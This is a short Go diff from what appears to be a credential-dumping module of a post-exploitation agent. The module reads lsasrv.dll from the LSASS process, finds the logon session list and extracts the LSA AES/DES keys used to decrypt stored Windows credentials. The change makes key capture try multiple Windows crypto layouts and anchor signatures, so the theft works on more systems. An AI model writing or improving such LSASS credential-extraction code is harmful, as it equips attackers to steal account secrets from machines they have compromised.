@@ -69,14 +69,22 @@ func executeInsituFull() structs.CommandResult {
 	if err != nil {
 		return errorf("Phase 2B: read lsasrv.dll image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
 	}
-	anchor, err := findLogonSessionListAnchor(lsasrvBytes, mod.Base)
+	anchor, sigVariant, err := findLogonSessionListAnchorMulti(lsasrvBytes, mod.Base)
 	if err != nil {
 		return errorf("Phase 2B: %v", err)
 	}
+	_ = sigVariant
 
 	reader := lsassRemoteReader{h: h}
-	cryptoLayout := LsaCryptoWin10W8
-	cryptoReport, cryptoMaterial, cryptoErrStr := captureLsaCrypto(reader, lsasrvBytes, mod.Base, cryptoLayout)
+	var cryptoReport insituFullCryptoReport
+	var cryptoMaterial lsaCryptoMaterial
+	var cryptoErrStr string
+	for _, cryptoLayout := range lsaCryptoLayouts {
+		cryptoReport, cryptoMaterial, cryptoErrStr = captureLsaCrypto(reader, lsasrvBytes, mod.Base, cryptoLayout)
+		if cryptoMaterial.HasAESKey() || cryptoMaterial.HasDESKey() {
+			break
+		}
+	}
 	canDecrypt := cryptoMaterial.HasAESKey() || cryptoMaterial.HasDESKey()
 
 	layout := LayoutWin10W8
